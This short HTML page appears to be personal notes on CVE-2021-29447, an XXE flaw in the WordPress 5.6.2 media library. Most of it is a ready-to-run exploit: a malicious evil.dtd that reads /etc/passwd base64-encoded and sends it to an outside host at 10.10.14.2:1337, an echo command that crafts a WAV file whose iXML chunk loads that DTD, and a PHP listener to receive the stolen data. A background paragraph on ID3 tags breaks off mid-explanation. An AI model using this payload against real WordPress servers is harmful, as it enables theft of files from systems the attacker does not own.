<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>cve-2021-29447 - wordpress 5.6.2</title>
</head><body>https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/<br/>
<br/>
<br/>
Metadata and iXML<br/>
Audio file format MPEG layer I, layer II and layer III (MP3) need a way to include information about the track (such as Artist name, Album name, Year, etc…). ID3 is a small chunk of extra data at the end of the file to carry information about the audio. The tag consists in 128 bytes (125 bytes + 3 bytes of “TAG” prefix) and has the following layout:<br/>
<br/>
<br/>
<br/>
<b>XXE</b><br/>
<b>evil.dtd</b><br/>
<br/>
&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"&gt;<br/>
&lt;!ENTITY % init "&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.2:1337/?p=%file;'&gt;" &gt; &nbsp; &nbsp;<br/>
<br/>
<br/>
<br/>
<b>attacker terminal for generate payload</b><br/>
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '"'"'http://10.10.14.2/evil.dtd'"'"'&gt;%remote;%init;%trick;]&gt;\x00' &gt; payload.wav<br/>
<br/>
<br/>
<b><br/>
</b><b>listen</b><br/>
<br/>
php -S 10.10.14.2:1337<br/>
</body></html>